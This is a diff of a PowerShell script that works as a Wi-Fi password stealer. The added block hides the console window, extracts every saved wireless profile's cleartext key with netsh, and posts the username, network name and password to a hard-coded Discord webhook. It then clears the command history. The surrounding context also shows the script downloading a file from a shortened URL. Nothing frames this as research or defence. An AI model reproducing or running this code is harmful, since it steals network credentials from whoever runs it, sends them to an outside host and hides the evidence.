@@ -1,6 +1,31 @@
 # ##############################################################################
 Clear-History
 
+###############################################################################
+Add-Type '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name 'Win32ShowWindow' -Namespace 'Win32' -PassThru | Out-Null
+$consolePtr = [Win32.Win32ShowWindow]::GetConsoleWindow()
+[Win32.Win32ShowWindow]::ShowWindow($consolePtr, 0)  # 0 hides the window
+
+# ENG
+netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+    
+    $wlan  = $_.Matches.Value
+    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+	$discord='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
+
+	$Body = @{
+		'username' = $env:username + " | " + [string]$wlan
+		'content' = [string]$passw
+	}
+	
+	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+}
+
+# Clear the PowerShell command history
+Clear-History
+
+###############################################################################
+
 Add-Type @"
     using System;
     using System.Runtime.InteropServices;
@@ -24,30 +49,6 @@ Add-Type @"
 
 # Hide the console window
 [ConsoleWindow]::Hide()
-
-###############################################################################
-
-# ENG
-netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
-    [ConsoleWindow]::Hide()
-
-    $wlan  = $_.Matches.Value
-    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
-	$discord='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
-
-	$Body = @{
-		'username' = $env:username + " | " + [string]$wlan
-		'content' = [string]$passw
-	}
-	
-	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
-}
-
-# Clear the PowerShell command history
-Clear-History
-
-[ConsoleWindow]::Hide()
-###############################################################################
 
 # Define the URL of the file to be downloaded
 $url = "https://lnkfwd.com/u/Kpj_Yric"  # Replace with your file URL
